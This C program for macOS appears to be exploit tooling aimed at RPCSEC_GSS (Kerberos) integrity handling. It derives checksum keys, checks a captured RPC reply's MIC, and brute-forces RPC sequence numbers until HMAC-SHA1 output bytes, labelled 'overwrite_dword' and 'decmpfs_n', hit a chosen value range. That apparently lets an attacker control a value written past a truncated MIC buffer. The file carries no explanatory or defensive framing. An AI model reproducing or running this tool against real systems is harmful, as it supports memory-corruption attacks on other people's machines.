#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonDigest.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

enum {
    AES_BLOCK_SIZE = 16,
    DES_BLOCK_SIZE = 8,
    DES3_KEY_SIZE = 24,
    DES3_RAW_KEY_SIZE = 21,
    HMAC_BLOCK_SIZE = 64,
    SHA1_SIZE = 20,
    KRB5_USAGE_SIZE = 5,
    KRB5_ACCEPTOR_SIGN_USAGE = 23,
    MAX_REPLY_SIZE = 64 * 1024 * 1024,
};

struct hmac_sha1_template {
    CC_SHA1_CTX inner;
    CC_SHA1_CTX outer;
};

static int
hex_value(char character)
{
    if (character >= '0' && character <= '9') {
        return character - '0';
    }
    if (character >= 'a' && character <= 'f') {
        return character - 'a' + 10;
    }
    if (character >= 'A' && character <= 'F') {
        return character - 'A' + 10;
    }
    return -1;
}

static int
decode_hex(const char *text, uint8_t *output, size_t output_size)
{
    if (strlen(text) != output_size * 2) {
        return -1;
    }
    for (size_t index = 0; index < output_size; index++) {
        int high = hex_value(text[index * 2]);
        int low = hex_value(text[index * 2 + 1]);

        if (high < 0 || low < 0) {
            return -1;
        }
        output[index] = (uint8_t)((high << 4) | low);
    }
    return 0;
}

static void
print_hex(const uint8_t *bytes, size_t length)
{
    for (size_t index = 0; index < length; index++) {
        printf("%02x", bytes[index]);
    }
}

static int
parse_u32(const char *text, uint32_t *value)
{
    char *end = NULL;
    unsigned long long parsed;

    errno = 0;
    parsed = strtoull(text, &end, 0);
    if (errno != 0 || text[0] == '\0' || end == NULL || *end != '\0' ||
        parsed > UINT32_MAX) {
        return -1;
    }
    *value = (uint32_t)parsed;
    return 0;
}

static void
put_be32(uint8_t output[4], uint32_t value)
{
    output[0] = (uint8_t)(value >> 24);
    output[1] = (uint8_t)(value >> 16);
    output[2] = (uint8_t)(value >> 8);
    output[3] = (uint8_t)value;
}

static uint32_t
get_le32(const uint8_t input[4])
{
    return (uint32_t)input[0] |
        ((uint32_t)input[1] << 8) |
        ((uint32_t)input[2] << 16) |
        ((uint32_t)input[3] << 24);
}

static uint32_t
get_be32(const uint8_t input[4])
{
    return ((uint32_t)input[0] << 24) |
        ((uint32_t)input[1] << 16) |
        ((uint32_t)input[2] << 8) |
        (uint32_t)input[3];
}

static int
read_file(const char *path, uint8_t **contents, size_t *length)
{
    struct stat status;
    uint8_t *buffer = NULL;
    size_t offset = 0;
    int descriptor;

    descriptor = open(path, O_RDONLY);
    if (descriptor < 0 || fstat(descriptor, &status) < 0 ||
        !S_ISREG(status.st_mode) || status.st_size <= 0 ||
        (uint64_t)status.st_size > MAX_REPLY_SIZE) {
        if (descriptor >= 0)
            close(descriptor);
        return -1;
    }
    buffer = malloc((size_t)status.st_size);
    if (buffer == NULL) {
        close(descriptor);
        return -1;
    }
    while (offset < (size_t)status.st_size) {
        ssize_t received = read(descriptor, buffer + offset,
            (size_t)status.st_size - offset);
        if (received <= 0) {
            free(buffer);
            close(descriptor);
            return -1;
        }
        offset += (size_t)received;
    }
    close(descriptor);
    *contents = buffer;
    *length = offset;
    return 0;
}

static void
rotate_right_13(uint8_t *buffer, size_t bit_length)
{
    size_t byte_length = (bit_length + 7) / 8;
    uint8_t *copy = calloc(byte_length, 1);
    size_t bits = 13 % bit_length;
    size_t last_bits = bit_length % 8;

    if (copy == NULL) {
        abort();
    }
    memcpy(copy, buffer, byte_length);
    if (last_bits != 0) {
        copy[byte_length - 1] &= (uint8_t)(0xffU << (8 - last_bits));
        for (size_t index = last_bits; index < 8; index += bit_length) {
            copy[byte_length - 1] |= buffer[0] >> index;
        }
    }
    for (size_t index = 0; index < byte_length; index++) {
        ssize_t bit = (ssize_t)(8 * index) - (ssize_t)bits;
        size_t first_byte;
        size_t first_shift;
        size_t second_byte;
        size_t second_shift;

        while (bit < 0) {
            bit += (ssize_t)bit_length;
        }
        first_byte = (size_t)bit / 8;
        first_shift = (size_t)bit % 8;
        if ((size_t)bit + 8 > byte_length * 8) {
            second_shift = (bit_length + 8 - first_shift) % 8;
        } else {
            second_shift = 8 - first_shift;
        }
        second_byte = (first_byte + 1) % byte_length;
        buffer[index] = (uint8_t)((copy[first_byte] << first_shift) |
            (copy[second_byte] >> second_shift));
    }
    free(copy);
}

static void
ones_complement_add(uint8_t *destination, const uint8_t *source,
    size_t length)
{
    int carry = 0;

    for (ssize_t index = (ssize_t)length - 1; index >= 0; index--) {
        int value = destination[index] + source[index] + carry;

        carry = value > 0xff;
        destination[index] = (uint8_t)value;
    }
    for (ssize_t index = (ssize_t)length - 1;
        carry != 0 && index >= 0; index--) {
        int value = destination[index] + carry;

        carry = value > 0xff;
        destination[index] = (uint8_t)value;
    }
}

static void
n_fold(const uint8_t *input, size_t input_length, uint8_t *output,
    size_t output_length)
{
    size_t temporary_size = 2 * (input_length > output_length ?
        input_length : output_length);
    uint8_t *temporary = calloc(temporary_size, 1);
    uint8_t *rotated = malloc(input_length);
    size_t buffered = 0;

    if (temporary == NULL || rotated == NULL) {
        abort();
    }
    memcpy(rotated, input, input_length);
    memset(output, 0, output_length);
    do {
        memcpy(temporary + buffered, rotated, input_length);
        buffered += input_length;
        rotate_right_13(rotated, input_length * 8);
        while (buffered >= output_length) {
            ones_complement_add(output, temporary, output_length);
            buffered -= output_length;
            if (buffered != 0) {
                memmove(temporary, temporary + output_length, buffered);
            }
        }
    } while (buffered != 0);
    free(rotated);
    free(temporary);
}

static void
set_odd_parity(uint8_t *key, size_t key_length)
{
    for (size_t index = 0; index < key_length; index++) {
        uint8_t value = key[index] & 0xfeU;
        unsigned ones = 0;

        for (unsigned bit = 1; bit < 8; bit++) {
            ones += (value >> bit) & 1U;
        }
        key[index] = value | (uint8_t)((ones & 1U) == 0);
    }
}

static void
make_des_key(const uint8_t raw_key[7], uint8_t des_key[8])
{
    uint8_t value = 0;

    memcpy(des_key, raw_key, 7);
    for (size_t index = 0; index < 7; index++) {
        value |= (uint8_t)((des_key[index] & 1U) << (index + 1));
    }
    des_key[7] = value;
    set_odd_parity(des_key, DES_BLOCK_SIZE);
}

static int
derive_des3_checksum_key(const uint8_t context_key[DES3_KEY_SIZE],
    const uint8_t usage[KRB5_USAGE_SIZE],
    uint8_t checksum_key[DES3_KEY_SIZE])
{
    uint8_t block[DES_BLOCK_SIZE];
    uint8_t raw_key[DES3_KEY_SIZE];
    uint8_t zero_iv[DES_BLOCK_SIZE] = {0};

    n_fold(usage, KRB5_USAGE_SIZE, block, sizeof(block));
    for (size_t index = 0; index < sizeof(raw_key) / sizeof(block);
        index++) {
        uint8_t encrypted[DES_BLOCK_SIZE];
        size_t moved = 0;
        CCCryptorStatus status;

        status = CCCrypt(kCCEncrypt, kCCAlgorithm3DES, 0,
            context_key, DES3_KEY_SIZE, zero_iv,
            block, sizeof(block), encrypted, sizeof(encrypted), &moved);
        if (status != kCCSuccess || moved != sizeof(encrypted)) {
            return -1;
        }
        memcpy(raw_key + index * sizeof(block), encrypted,
            sizeof(encrypted));
        memcpy(block, encrypted, sizeof(block));
    }
    for (size_t index = 0; index < 3; index++) {
        make_des_key(raw_key + index * (DES_BLOCK_SIZE - 1),
            checksum_key + index * DES_BLOCK_SIZE);
    }
    return 0;
}

static int
derive_checksum_key(const uint8_t *context_key, size_t key_length,
    uint8_t *checksum_key)
{
    uint8_t usage[KRB5_USAGE_SIZE] = {
        0, 0, 0, KRB5_ACCEPTOR_SIGN_USAGE, 0x99
    };
    uint8_t block[AES_BLOCK_SIZE];
    uint8_t zero_iv[AES_BLOCK_SIZE] = {0};
    size_t produced = 0;

    if (key_length == DES3_KEY_SIZE) {
        return derive_des3_checksum_key(context_key, usage, checksum_key);
    }
    if (key_length != 16 && key_length != 32) {
        return -1;
    }
    n_fold(usage, sizeof(usage), block, sizeof(block));
    while (produced < key_length) {
        uint8_t encrypted[AES_BLOCK_SIZE];
        size_t moved = 0;
        size_t copy_length = key_length - produced;
        CCCryptorStatus status;

        status = CCCrypt(kCCEncrypt, kCCAlgorithmAES, 0,
            context_key, key_length, zero_iv,
            block, sizeof(block), encrypted, sizeof(encrypted), &moved);
        if (status != kCCSuccess || moved != sizeof(encrypted)) {
            return -1;
        }
        if (copy_length > sizeof(encrypted)) {
            copy_length = sizeof(encrypted);
        }
        memcpy(checksum_key + produced, encrypted, copy_length);
        memcpy(block, encrypted, sizeof(block));
        produced += copy_length;
    }
    return 0;
}

static void
hmac_sha1_template_init(struct hmac_sha1_template *template,
    const uint8_t *key, size_t key_length)
{
    uint8_t inner_pad[HMAC_BLOCK_SIZE];
    uint8_t outer_pad[HMAC_BLOCK_SIZE];

    memset(inner_pad, 0x36, sizeof(inner_pad));
    memset(outer_pad, 0x5c, sizeof(outer_pad));
    for (size_t index = 0; index < key_length; index++) {
        inner_pad[index] ^= key[index];
        outer_pad[index] ^= key[index];
    }
    CC_SHA1_Init(&template->inner);
    CC_SHA1_Update(&template->inner, inner_pad, sizeof(inner_pad));
    CC_SHA1_Init(&template->outer);
    CC_SHA1_Update(&template->outer, outer_pad, sizeof(outer_pad));
}

static void
hmac_sha1(const struct hmac_sha1_template *template,
    const uint8_t *message, size_t message_length, uint8_t digest[SHA1_SIZE])
{
    CC_SHA1_CTX inner = template->inner;
    CC_SHA1_CTX outer = template->outer;
    uint8_t inner_digest[SHA1_SIZE];

    CC_SHA1_Update(&inner, message, (CC_LONG)message_length);
    CC_SHA1_Final(inner_digest, &inner);
    CC_SHA1_Update(&outer, inner_digest, sizeof(inner_digest));
    CC_SHA1_Final(digest, &outer);
}

static int
verify_integrity_reply(const char *key_text, const char *reply_path)
{
    enum {
        RPC_REPLY = 1,
        RPC_MSG_ACCEPTED = 0,
        RPC_SUCCESS = 0,
        RPCSEC_GSS = 6,
        CFX_HEADER_SIZE = 16,
        CFX_AES_MIC_SIZE = 28,
        CFX_AES_DIGEST_SIZE = 12,
    };
    uint8_t context_key[32];
    uint8_t checksum_key[32];
    uint8_t digest[SHA1_SIZE];
    uint8_t *reply = NULL;
    uint8_t *message = NULL;
    size_t key_length = strlen(key_text) / 2;
    size_t reply_length = 0;
    size_t verifier_length;
    size_t accept_offset;
    size_t body_length;
    size_t body_offset;
    size_t padded_body_length;
    size_t mic_length_offset;
    size_t mic_length;
    size_t mic_offset;
    size_t padded_mic_length;
    struct hmac_sha1_template hmac_template;
    int matched = 0;
    int result = 2;

    if ((key_length != 16 && key_length != DES3_KEY_SIZE &&
        key_length != 32) || strlen(key_text) != key_length * 2 ||
        decode_hex(key_text, context_key, key_length) < 0 ||
        derive_checksum_key(context_key, key_length, checksum_key) < 0 ||
        read_file(reply_path, &reply, &reply_length) < 0) {
        fprintf(stderr, "invalid context key or unreadable reply file\n");
        goto out;
    }
    if (reply_length < 56 || get_be32(reply + 4) != RPC_REPLY ||
        get_be32(reply + 8) != RPC_MSG_ACCEPTED ||
        get_be32(reply + 12) != RPCSEC_GSS) {
        fprintf(stderr, "not an accepted RPCSEC_GSS reply\n");
        goto out;
    }
    verifier_length = get_be32(reply + 16);
    if (verifier_length != CFX_AES_MIC_SIZE) {
        fprintf(stderr, "unexpected RPC verifier length: %zu\n",
            verifier_length);
        goto out;
    }
    accept_offset = 20 + ((verifier_length + 3U) & ~3U);
    if (accept_offset > reply_length - 8 ||
        get_be32(reply + accept_offset) != RPC_SUCCESS) {
        fprintf(stderr, "RPC reply was not successful or is truncated\n");
        goto out;
    }
    body_length = get_be32(reply + accept_offset + 4);
    body_offset = accept_offset + 8;
    padded_body_length = (body_length + 3U) & ~3U;
    if (body_offset > reply_length ||
        padded_body_length > reply_length - body_offset ||
        reply_length - body_offset - padded_body_length < 4) {
        fprintf(stderr, "invalid integrity-body extent\n");
        goto out;
    }
    mic_length_offset = body_offset + padded_body_length;
    mic_length = get_be32(reply + mic_length_offset);
    mic_offset = mic_length_offset + 4;
    padded_mic_length = (mic_length + 3U) & ~3U;
    if (mic_length != CFX_AES_MIC_SIZE ||
        padded_mic_length != reply_length - mic_offset ||
        reply[mic_offset] != 0x04 || reply[mic_offset + 1] != 0x04 ||
        body_length > SIZE_MAX - CFX_HEADER_SIZE) {
        fprintf(stderr, "invalid trailing CFX MIC extent or token ID\n");
        goto out;
    }
    message = malloc(body_length + CFX_HEADER_SIZE);
    if (message == NULL) {
        fprintf(stderr, "message allocation failed\n");
        goto out;
    }
    memcpy(message, reply + body_offset, body_length);
    memcpy(message + body_length, reply + mic_offset, CFX_HEADER_SIZE);
    hmac_sha1_template_init(&hmac_template, checksum_key, key_length);
    hmac_sha1(&hmac_template, message, body_length + CFX_HEADER_SIZE,
        digest);
    matched = memcmp(digest, reply + mic_offset + CFX_HEADER_SIZE,
        CFX_AES_DIGEST_SIZE) == 0;

    printf("reply_file=%s\n", reply_path);
    printf("reply_length=%zu\n", reply_length);
    printf("body_length=%zu\n", body_length);
    printf("body_sequence=%u\n", get_be32(reply + body_offset));
    printf("context_key=");
    print_hex(context_key, key_length);
    printf("\nchecksum_key=");
    print_hex(checksum_key, key_length);
    printf("\ntoken_header=");
    print_hex(reply + mic_offset, CFX_HEADER_SIZE);
    printf("\nwire_mic=");
    print_hex(reply + mic_offset + CFX_HEADER_SIZE,
        CFX_AES_DIGEST_SIZE);
    printf("\ncomputed_hmac_sha1=");
    print_hex(digest, sizeof(digest));
    printf("\nprefix_match=%s", matched ? "yes" : "no");
    printf("\noverwrite_dword=0x%08x\n", get_le32(digest + 16));
    result = matched ? 0 : 1;

out:
    free(message);
    free(reply);
    return result;
}

int
main(int argc, char **argv)
{
    uint8_t context_key[32];
    uint8_t checksum_key[32];
    uint8_t trailer[16];
    uint8_t rpc_message[4 + sizeof(trailer)];
    uint8_t digest[SHA1_SIZE];
    size_t key_length;
    uint32_t minimum_value;
    uint32_t maximum_value;
    uint32_t start_sequence = 1;
    uint32_t end_sequence = UINT32_MAX;
    uint64_t attempts = 0;
    int scan_dword;
    struct hmac_sha1_template hmac_template;

    if (argc == 4 && strcmp(argv[1], "--verify-integrity-reply") == 0)
        return verify_integrity_reply(argv[2], argv[3]);

    if (argc < 6 || argc > 8 ||
        (strcmp(argv[1], "--scan-rpcseq") != 0 &&
        strcmp(argv[1], "--scan-dword") != 0)) {
        fprintf(stderr,
            "usage: %s MODE CONTEXT_KEY_HEX TOKEN_HEADER_HEX MIN MAX "
            "[START_SEQ [END_SEQ]]\n"
            "       %s --verify-integrity-reply CONTEXT_KEY_HEX "
            "REPLY_FILE\n", argv[0], argv[0]);
        return 2;
    }
    key_length = strlen(argv[2]) / 2;
    scan_dword = strcmp(argv[1], "--scan-dword") == 0;
    if ((key_length != 16 && key_length != DES3_KEY_SIZE &&
        key_length != 32) ||
        strlen(argv[2]) != key_length * 2 ||
        decode_hex(argv[2], context_key, key_length) < 0 ||
        decode_hex(argv[3], trailer, sizeof(trailer)) < 0 ||
        parse_u32(argv[4], &minimum_value) < 0 ||
        parse_u32(argv[5], &maximum_value) < 0 ||
        minimum_value > maximum_value ||
        (!scan_dword && maximum_value > UINT32_MAX - 16U) ||
        (argc >= 7 && parse_u32(argv[6], &start_sequence) < 0) ||
        (argc == 8 && parse_u32(argv[7], &end_sequence) < 0) ||
        start_sequence == 0 || start_sequence > end_sequence ||
        derive_checksum_key(context_key, key_length, checksum_key) < 0) {
        fprintf(stderr, "invalid input or key derivation failure\n");
        return 2;
    }
    hmac_sha1_template_init(&hmac_template, checksum_key, key_length);

    memcpy(rpc_message + 4, trailer, sizeof(trailer));
    for (uint64_t candidate = start_sequence;
        candidate <= end_sequence; candidate++) {
        uint32_t overwrite;
        uint32_t value;

        put_be32(rpc_message, (uint32_t)candidate);
        hmac_sha1(&hmac_template, rpc_message, sizeof(rpc_message), digest);
        overwrite = get_le32(digest + 16);
        attempts++;
        if (!scan_dword && overwrite < 16U) {
            continue;
        }
        value = scan_dword ? overwrite : overwrite - 16U;
        if (value < minimum_value || value > maximum_value) {
            continue;
        }
        printf("context_key=");
        print_hex(context_key, key_length);
        printf("\nchecksum_key=");
        print_hex(checksum_key, key_length);
        printf("\nrpc_sequence=%u", (uint32_t)candidate);
        printf("\nmessage=");
        print_hex(rpc_message, sizeof(rpc_message));
        printf("\nhmac_sha1=");
        print_hex(digest, sizeof(digest));
        printf("\noverwrite_dword=0x%08x", overwrite);
        if (scan_dword) {
            printf("\nmatched_dword=%u", value);
        } else {
            printf("\ndecmpfs_n=%u", value);
        }
        printf("\nattempts=%llu\n", attempts);
        return 0;
    }
    fprintf(stderr, "no match in sequence range after %llu attempts\n",
        attempts);
    return 1;
}
